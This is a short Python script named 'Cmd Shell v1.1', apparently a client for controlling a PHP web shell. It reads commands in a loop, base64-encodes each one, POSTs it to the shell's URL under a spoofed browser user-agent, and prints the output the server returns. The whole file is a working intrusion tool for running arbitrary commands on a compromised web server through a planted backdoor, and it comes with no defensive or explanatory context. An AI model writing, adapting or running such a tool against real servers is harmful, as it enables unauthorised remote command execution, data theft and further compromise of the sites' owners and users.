import requests,sys
h = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36'}
def useage():
	print ("Cmd Shell v1.1")
	print ("python http://url/path/shell.php")
def main(url):
	while(1):
		try:
			cmd = raw_input('$')
			if cmd == 'quit' or cmd == 'exit':
				break
			cmd2 = {'c':cmd.encode('base64','strict')}
			r = requests.post(url,headers=h,data=cmd2)
			if r.status_code == 200:
				print (r.content)
			else:
				print ('Error!!!')
				break
		except:
			print ('Error!')
	
try:
	if len(sys.argv) == 2:
		main(sys.argv[1])
	else:
		useage()
except KeyboardInterrupt as e:
	sys.exit()
